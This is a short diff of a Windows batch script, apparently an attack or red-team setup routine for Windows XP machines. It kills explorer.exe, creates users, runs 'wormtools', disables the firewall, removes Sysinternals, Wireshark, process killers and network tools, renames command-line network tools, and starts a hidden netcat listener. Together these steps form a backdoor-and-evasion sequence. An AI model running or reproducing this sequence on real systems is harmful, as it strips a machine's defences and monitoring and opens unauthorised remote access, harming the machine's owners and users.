@@ -1,14 +1,13 @@
 @echo off
 ::setup scripting for Windows Xp tools
 
-call disableGUI.bat
-call createUsers.bat
+taskkill /IM explorer.exe /F
+call createusers.bat
 call wormtools.bat
-call disableDefender.bat
 call disablefirewall.bat
-call removeKillers.bat
-call removeNetworkTools.bat
+call removekillers.bat
+call removenetworktools.bat
 call removeSYSinternals.bat
 call removewireshark.bat
-call renameCliNetworkTools.bat
+call renameclinetworktools.bat
 start /min netcatlistener.bat
